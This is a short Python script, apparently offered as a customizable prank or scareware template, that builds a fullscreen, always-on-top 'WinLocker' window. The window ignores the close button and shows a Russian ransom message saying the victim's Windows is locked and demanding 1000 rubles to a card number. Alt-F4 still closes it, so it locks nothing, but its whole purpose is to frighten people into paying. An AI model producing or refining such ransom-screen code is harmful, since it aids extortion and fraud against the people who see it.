import tkinter as tk
import sys

def main():
    root = tk.Tk()
    root.title("WinLocker")

    root.attributes("-fullscreen", True)
    root.configure(bg="black")
    root.attributes("-topmost", True)

    root.bind("<Alt-F4>", lambda e: root.destroy())

    root.protocol("WM_DELETE_WINDOW", lambda: None)

    label = tk.Label(
        root,
        text="⚠ ~~ WINLOCKER ~~ ⚠", #Тут вы можете изменить текст на любой другой, который вам нравится
        fg="red",
        bg="black",
        font=("Courier New", 28, "bold")
    )
    label.place(relx=0.5, rely=0.45, anchor="center")

    sub = tk.Label(
        root,
        text="Твой Виндовс был заблокирован! Чтобы разблокировать его, отправь 1000 рублей на карту 1234 5678 9012 3456.", #Тут вы можете изменить текст на любой другой, который вам нравится
        fg="#333333",
        bg="black",
        font=("Courier New", 12)
    )
    sub.place(relx=0.5, rely=0.55, anchor="center")

    root.mainloop()

if __name__ == "__main__":
    main()
